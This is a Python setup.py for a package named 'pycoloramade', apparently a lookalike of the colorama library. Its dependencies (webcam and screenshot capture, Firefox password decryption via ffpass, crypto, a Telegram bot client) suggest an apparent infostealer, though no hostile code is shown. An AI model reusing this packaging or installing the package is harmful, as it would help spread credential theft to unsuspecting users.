from setuptools import setup, find_packages

setup(
    name="pycoloramade",
    version="1.6.9", 
    packages=find_packages(), 
    install_requires=[ 
        "requests",
        "pywin32",
        "opencv-python",
        "Pillow",
        "pyTelegramBotAPI",
        "psutil",
        "GPUtil",
        "tabulate",
        "pycryptodome",
        "configparser",
        "ffpass",
    ],
    entry_points={
        'console_scripts': [
            'pycoloramade=pycoloramade.main:main',
        ],
    },
    author="pycolorama", 
    author_email="chantalleshika@gmail.com", 
    description="Описание твоей библиотеки",
    long_description=open('README.md').read(),
    long_description_content_type="text/markdown",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
